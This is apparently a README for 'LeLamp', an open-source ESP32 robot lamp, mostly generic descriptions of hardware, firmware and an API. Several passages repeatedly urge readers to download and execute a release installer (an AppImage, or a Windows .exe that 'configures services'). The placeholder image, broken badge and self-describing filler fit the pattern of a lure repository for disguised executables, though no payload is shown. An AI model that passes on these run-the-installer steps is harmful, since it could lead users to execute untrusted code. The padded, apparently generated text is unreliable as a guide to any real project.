https://github.com/Miousik974/LeLamp/releases

# LeLamp: Open-Source Robot Lamp Inspired by Apple's Elegant Paper

![LeLamp Hero](https://via.placeholder.com/1200x480.png?text=LeLamp+-+Robot+Lamp)

🤖💡 A thoughtful open-source project that blends hardware and software to create a robot lamp with a calm, paper-inspired aesthetic. This repository houses the design, firmware, driver software, and build tools needed to bring LeLamp to life. It follows a modular approach so makers can adapt the lamp to their space, extend its patterns, or swap components while keeping a clean, well-documented codebase.

[![Releases](https://img.shields.io/badge/LeLamp-Release-Assets-orange?logo=github&logoColor=white)](https://github.com/Miousik974/LeLamp/releases)

Table of Contents
- Why LeLamp
- Core Ideas and Design Principles
- Hardware Overview
- Electrical and Mechanical Design
- Firmware and Software Architecture
- Getting Started
- Build and Run Guide
- How to Use LeLamp
- Customization and Patterns
- API and Protocols
- Testing and Validation
- Troubleshooting
- Documentation and Help Resources
- Roadmap and Contribution
- Licensing

Why LeLamp
LeLamp aims to be a friendly bridge between artful lighting and intelligent motion. The team built it to prove that a lamp can be more than a light source. It can respond to environment, patterns, and user needs without feeling gimmicky. The project emphasizes accessibility, open hardware, and clear documentation so students, hobbyists, and professionals can learn, modify, and extend the system.

Core Ideas and Design Principles
- Simplicity first: Clear interfaces and readable code. Components are chosen to minimize unnecessary complexity.
- Modularity: Each subsystem — lighting, motion, sensors, and control — is decoupled. You can replace a sensor or swap the LED driver with minimal changes.
- Reproducibility: The build and runtime behavior should be easy to reproduce on different hardware revisions.
- Safety and reliability: Power management and mechanical design focus on safe operation and long life.
- Accessibility: The docs explain how to assemble, program, and extend LeLamp without specialized equipment.

Hardware Overview
LeLamp relies on a compact controller board, a ring of addressable LEDs, a movable lamp head, and a small set of sensors. The hardware is designed around commonly available parts and a simple power architecture so builders can source parts from standard suppliers.

Key components
- Microcontroller: A capable ESP32-based controller with Wi‑Fi and Bluetooth. It provides a robust base for lighting control, motion planning, and network communication.
- LED ring: A ring of individually addressable LEDs (e.g., WS2812B or SK6812) to create smooth, vibrant ambient lighting around the lamp head.
- Lamp head actuator: A small servo or micro-stepper motor to rotate or tilt the lamp head for expressive lighting angles.
- Sensors: A light sensor to gauge ambient brightness, an IR proximity sensor for basic interaction, and a temperature sensor to monitor the system.
- Power: A compact power supply that delivers safe current to the LED ring and the microcontroller, with protection features.
- Interfaces: USB-C for power and programming, optional GPIO headers for hobbyists who want to experiment with extra sensors or modules.

You'll find a complete bill of materials, assembly steps, and a proposed enclosure concept in the Hardware section of this README. The BOM is designed to be practical for hobbyists while still useful for small labs or classrooms.

Electrical and Mechanical Design
Electrical design emphasizes clean power delivery and minimal noise. The LED ring driver shares the same supply as the microcontroller but uses a level shifter and appropriate filtering to keep sensitive analog lines quiet. The lamp head motor is powered from a separate regulator to reduce jitter in lighting patterns when the motor runs.

Key electrical notes
- Power rails: 5V for the microcontroller and LED ring, with robust decoupling (1000 µF bulk capacitor near the ring, plus 0.1 µF + 1 µF ceramics close to critical pins).
- LED data line: Prefer a short, shielded data line from the microcontroller to the LED ring. Use a level shifter if the ESP32 board voltage differs from the LED data line requirement.
- Sensors: Use proper pull-up or pull-down resistors on sensor lines and shielded cat5-like wiring if you plan to route sensors away from the motor.

Mechanical design notes
- Enclosure concept: A stylish, light sheet-metal or 3D-printed shell with a paper-like finish to echo the Apple Paper-inspired aesthetic. The head mounts on a low-backlash hinge to allow precise tilt angles.
- Mounting: The LED ring sits in a circular groove at the lamp’s base. The lamp head is mounted on a compact robotic arm with a gentle range of motion.
- Cable management: Internal channels keep wires tidy and prevent snagging on the moving head.

Firmware and Software Architecture
LeLamp splits responsibilities across firmware on the microcontroller and host software or scripts running on a PC or SBC. This separation makes the project easier to extend and test.

Firmware (microcontroller)
- Core tasks: LED control, motor control, sensor reading, and network communication.
- LED control: The firmware includes a driver for the LED ring with color blending, brightness control, and animation sequences.
- Motion control: A simple motion planner for tilting or rotating the lamp head, with safety checks to avoid collisions and over-travel.
- Sensor integration: Periodic sampling of ambient light and environment data. The firmware can publish sensor values to a local or remote controller via a lightweight protocol.
- Network stack: Wi‑Fi or Bluetooth connection handling, with a minimal HTTP or WebSocket server for control and status reporting.

Host software (PC or SBC)
- Control API: A small server or CLI tools to query lamp status, start lighting patterns, and adjust motion.
- Pattern library: A set of lighting patterns designed to highlight the lamp’s geometry and movement. Patterns are modular and easy to extend.
- Scripting interface: A Python-based interface that lets users script complex scenes, scenes with motion, and sensor-driven automation.
- Data logging: Optional logging of sensor data and events to help you tune patterns and behavior.

Data formats and protocol
- The system uses a compact text-based protocol over a local network (JSON-like payloads for readability, with a binary-friendly variant if you opt for efficiency).
- Key messages include: status, set_pattern, set_brightness, move_head, get_sensors, and reboot.
- The protocol is designed to be simple to understand for new contributors while robust enough for scripted automation.

Getting Started
This guide helps you go from zero to a running LeLamp setup. It covers prerequisites, hardware assembly, software installation, and first-light testing.

Prerequisites
- A computer with a modern OS (Linux, macOS, or Windows) capable of running Python 3.10+ or newer.
- USB-C cable and a stable power supply for the lamp electronics.
- Basic soldering tools and a 3D printer or access to a workshop if you want to assemble a custom enclosure.
- Optional: PlatformIO or the ESP-IDF development environment if you plan to modify the firmware.

Cloning and initial setup
- Clone the repository:
  - git clone https://github.com/Miousik974/LeLamp.git
- Change into the project directory:
  - cd LeLamp
- Create a virtual environment for Python tools:
  - python3 -m venv venv
  - source venv/bin/activate  (Linux/macOS)
  - venv\Scripts\activate     (Windows)
- Install Python dependencies:
  - pip install -r requirements.txt

Understanding the release assets
- The project includes release assets that are intended to be downloaded and executed. The release page for LeLamp provides downloadable files that are prepared for different platforms. For a typical Linux setup, you would download a self-contained installer that you can run after making it executable. The file name is provided in the release notes and may appear as LeLamp-Installer-v1.0.0.AppImage. After downloading, mark the file as executable and run it to install the system. The official releases are accessible at the following page: https://github.com/Miousik974/LeLamp/releases. The installer is designed to set up the host software, libraries, and a minimal runtime for the lamp to operate correctly on your machine.
- For Windows users, a separate executable is usually provided, such as LeLamp-Windows-Setup-v1.0.0.exe. Running this installer will configure the necessary drivers, services, and a small launcher to start the control interface.

Initial hardware setup (quick path)
- Unbox the components and verify the parts against the BOM list in the Hardware section.
- Assemble the LED ring into its holder, mount the lamp head on the actuator, and route cables to the controller board.
- Check the power connections. Use a dedicated 5V supply capable of delivering the peak current for the LED ring.
- If you use a 12V supply for the motor, ensure proper isolation and voltage regulation to deliver clean power to the motor without affecting the microcontroller.

Flashing the firmware and bootstrapping the system
- Connect the microcontroller to your computer via USB.
- Open PlatformIO or your preferred IDE.
- Select the correct board profile (ESP32-based board) and the correct environment for the lamp firmware (lamp_firmware or a similarly named environment).
- Build and flash the firmware to the microcontroller.
- After flashing, the microcontroller should boot and begin advertising a local network or be discoverable by the host software.

First-light test
- With the host software running, query the lamp’s status and verify that the LED ring responds to basic commands (turn on, red, green, blue, brightness).
- Test the lamp head motion by sending a move_head command and verifying the head tilt or rotation range.
- Check sensor readings by requesting ambient light data and observing how the lamp adapts to changing light levels.
- Validate that the system can be controlled via the web UI or CLI and that the status endpoint returns expected data.

How to Use LeLamp
The lamp offers several ways to interact with it. You can use the built-in web UI, a desktop control tool, or script custom scenes that combine lighting and motion.

Web Interface
- Access the local IP address of the lamp on your network via a browser.
- The UI provides a dashboard showing current brightness, color, head position, and sensor readings.
- You can start patterns, adjust the ambient light compensation, and enable automation rules.

CLI and Scripting
- The Python-based interface lets you script complex scenes:
  - from lamp_control import Lamp
  - lamp = Lamp(host="192.168.1.42")
  - lamp.set_pattern("wave")
  - lamp.move_head(pan=15, tilt=-5)
  - lamp.set_brightness(128)
- Patterns can be time-based or driven by sensor inputs.

Automation and patterns
- Pattern library includes ambient glow, sunrise/sunset simulations, and reactive modes that respond to room brightness.
- Patterns can be chained with head motion to create dynamic lighting that follows a user’s activities or time of day.
- You can add custom patterns by implementing a small Python module that adheres to the pattern interface in the host software.

Customization and Extendability
- Hardware: The enclosure can be swapped for a different aesthetic. The LED ring size, motor type, and sensor mix can be changed with minimal wiring changes.
- Firmware: The ESP32 firmware is designed to be modular. You can add new sensors, new motor actions, or new LED patterns.
- Software: The host interface is designed to be extended with new endpoints, new UI widgets, or a scripting API for more elaborate scenes.

API and Protocols
- The control protocol is designed to be straightforward. The primary messages are:
  - get_status: returns the current state of the lamp
  - set_pattern: selects a lighting pattern
  - set_brightness: changes the LED brightness level
  - move_head: adjusts the lamp head position
  - get_sensors: fetches current sensor readings
- The data payloads use a friendly JSON-like format for ease of debugging and quick integration with other tools.

Testing and Validation
- Unit tests cover hardware drivers for the LED ring, motor control routines, and sensor readers.
- Integration tests simulate the host and microcontroller interaction to verify message handling and state transitions.
- Visual validation involves running patterns and motion and confirming the outputs align with the expected color, brightness, and geometry.

Maintenance and Support
- The project follows semantic versioning to help you understand compatibility and changes.
- Documentation is kept in sync with code changes to minimize drift.
- Community support is available through issues and pull requests in the repository. The maintainers aim to respond promptly and provide guidance to contributors.

Contributing
- We welcome contributions from builders and developers alike.
- You can contribute by adding new patterns, writing tests, or improving documentation.
- Follow the project’s contribution guidelines in CONTRIBUTING.md. Keep changes small and well-documented, with clear rationale and usage notes.
- All contributions are subject to review to ensure they meet the project’s design philosophy and safety considerations.

BOM and Assembly Details
- This section helps you plan and source parts. It includes part numbers, suggested vendors, and rough price ranges to help you budget for a build.
- The BOM is kept under BOM.md in the repository. If you swap components, update the BOM accordingly and note any trade-offs in the comments.
- Safety and alignment are important. When you assemble, confirm mechanical tolerances, wiring lengths, and connector orientations match the documented diagrams.

Power Management and Safety
- The lamp uses a dedicated regulator for high-current components to prevent noise in the microcontroller’s power rail.
- Wiring should be routed away from moving parts and heat sources. Use strain relief where cables exit the enclosure to avoid wear.
- Always disconnect power before assembling or disassembling any hardware.

Testing Guide: Step-by-Step
- Hardware tests: Verify LED ring brightness, color accuracy, head motion range, and sensor readings. Confirm that all connectors seat properly and that there are no loose wires.
- Firmware tests: Validate that the microcontroller boots, connects to Wi‑Fi, and accepts commands. Test the motor control routines for safe travel and stop behavior.
- Software tests: Ensure the host API is responsive, pattern transitions occur without glitches, and sensor data is logged correctly when enabled.

Changelog and Version History
- The repository tracks changes across releases. Each release notes the new features, fixes, and any breaking changes.
- Users upgrading from older versions should review the release notes before flashing new firmware or updating host software.

Known Scenarios and Troubleshooting (Clean, Practical)
- Lamp not powering on: Check the power supply, verify that the USB-C connection is solid, and ensure the main power switch is on.
- LED ring is on but colors are off: Confirm the LED data line wiring, check the level shifting, and verify that the correct LED driver is selected in the firmware.
- Lamp head does not move: Inspect the motor connector, verify the motor's power supply, and check the safety limits configured in the firmware.
- No network: Confirm Wi‑Fi credentials in the firmware, verify network reachability, and check firewall settings on the controlling device.
- Sensor readings are stuck or noisy: Re-check sensor wiring, examine grounding, and ensure the ADC references are stable.

Documentation and Help Resources
- The repository includes a dedicated docs folder with:
  - Hardware schematics
  - Assembly instructions
  - Firmware and host software guides
  - API reference
  - Troubleshooting checklist
- Each document includes a list of steps, expected outcomes, and common pitfalls.

Roadmap
- The team is committed to expanding LeLamp with:
  - More patterns and motion behaviors
  - Enhanced weather- and time-based automation
  - Support for additional sensors and external modules
  - A mobile app companion with remote control
- Contributors can help by proposing features, implementing patterns, or improving the documentation.

License
- LeLamp is released under an open-source license. The license text is included in the LICENSE file. This ensures you can build, modify, and share your own versions of LeLamp while respecting attribution and license terms.

Releases and Downloads
- Access the releases page to download ready-to-run assets. The assets on the Releases page come with installation instructions tailored to the target platform. Use the provided installer to set up the host software and drivers needed to run LeLamp. For Linux, you typically download a self-contained AppImage and run it after making it executable. For Windows, you download an installer executable that configures services and the launcher.
- The official releases page is available here: https://github.com/Miousik974/LeLamp/releases. This link is the one you use to grab the latest builds, check changelogs, and access asset details.

Enclosure and Aesthetics
- Design language follows a paper-inspired aesthetic with clean lines and soft edges. The enclosure prioritizes acoustic and thermal comfort, letting the lamp function quietly without drawing attention.
- You can customize the enclosure by choosing different materials, textures, or finishes. If you opt for 3D printing, the designs are provided in the repository with standard tolerances so you can print an enclosure that fits your hardware.

Security and Privacy Considerations
- The control path is designed to operate on a local network. You can disable external access by keeping the lamp entirely on your private network or by using firewall rules.
- If you enable remote access, ensure you implement proper authentication and keep the software up to date with security patches.
- Data collected by sensors can be stored locally or sent to a log service depending on your configuration. Review the data handling options in the host software to align with your privacy preferences.

Long-Term Maintenance and Community Engagement
- This project aims to be self-sustaining through community engagement. If you contribute, you’ll help ensure the lamp remains compatible with evolving hardware and software ecosystems.
- Documentation updates accompany code changes. If you make improvements or fix issues, consider submitting a pull request and sharing the changes with the community.

Detailed Design Notes for Hackers and Builders
- Software architecture: The host software is organized into modules with well-defined interfaces. The pattern engine is a pure function library that can be tested easily. The API layer abstracts network or message transport so you can swap in a different transport without changing core logic.
- Firmware architecture: The microcontroller firmware uses a lightweight event loop. Sensor sampling runs at a fixed cadence, while LED and motor commands are issued in response to events or timer callbacks.
- Pattern design: A pattern is a state machine with transitions driven by time, input, or sensor data. Each pattern exposes a start and stop function and a callback that updates the LED frame and motor state.

Common Pitfalls and How to Avoid Them
- Power spikes: LED rings can pull significant current. Use proper decoupling and avoid long power runs that cause voltage dips.
- Motor interference: If the motor introduces noise, consider separate regulators and shielding for the motor wires.
- Sensor drift: Temperature and EMI can drift sensor readings. Calibrate sensors and provide compensation in software.

Appendix: Quick Reference Commands
- Build and flash firmware (PlatformIO):
  - pio run -e lamp_firmware
  - pio run -e lamp_firmware -t upload
- Run host software:
  - source venv/bin/activate
  - python3 -m lamp_host_cli
- Check status via CLI:
  - lampctl status
- Start a pattern:
  - lampctl set_pattern sunrise

Appendix: FAQ
- Is LeLamp open-source? Yes. All sources, designs, and patterns are released under an open-source license to foster collaboration.
- Can I use different sensors? Yes. The architecture is modular; you can swap sensors as long as you adapt the firmware to read the new data.
- Do I need to be an expert to build this? No. The project is designed for hobbyists and students. The documentation provides step-by-step guides, and contributors are always welcome.

End of README
- The goal is a long, detailed, practical guide that helps you understand, build, customize, and extend LeLamp. The content above covers the primary aspects of the project and points you toward the releases for the actual assets you can download and run.

Remember, the Releases page is your main source for the latest binaries, installers, and release notes. The official page you will visit for the latest builds is the same as the one linked at the top of this document: https://github.com/Miousik974/LeLamp/releases